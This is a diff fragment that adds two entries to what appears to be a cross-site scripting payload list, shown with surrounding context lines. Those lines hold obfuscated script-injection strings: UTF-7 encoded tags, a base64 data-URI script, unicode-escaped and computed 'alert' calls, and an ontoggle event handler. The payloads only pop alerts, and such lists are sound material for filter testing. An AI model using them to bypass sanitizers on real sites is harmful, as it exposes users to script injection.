@@ -2,6 +2,7 @@
 <detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//
 <script>alert('test');</script>
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+$url = "<script>document.write(document.URL)</script>";
 +ADw-script+AD4- alert()+ADw-/script+AD4-
 <script>alert('xss')</script>
 +ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
@@ -10,6 +11,7 @@ alert(document.domain)
 (alert)(document.domain)
 al\u0065rt(document.domain)
 al\u{65}rt(document.domain)
+xss<script>alert(1)</script>
 window['alert'](document.domain) top['alert'](document.domain)
 top[8680439..toString(30)](document.domain) top[/alert/.source](document.domain)
 alert.call(null, document.domain) alert.apply(null, [document.domain])
